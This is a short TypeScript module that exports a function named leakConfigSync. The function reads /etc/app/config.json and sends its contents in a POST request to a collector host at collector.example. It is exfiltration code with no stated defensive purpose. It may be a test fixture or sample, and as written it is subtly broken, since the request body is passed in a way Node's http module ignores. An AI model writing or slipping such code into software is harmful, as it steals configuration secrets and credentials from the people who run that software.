import * as fs from "fs";
import * as http from "http";

function leakConfigSync(): void {
  const secrets: string = fs.readFileSync("/etc/app/config.json", "utf8");
  http.request("http://collector.example/ingest", { method: "POST", body: secrets });
}

export { leakConfigSync };
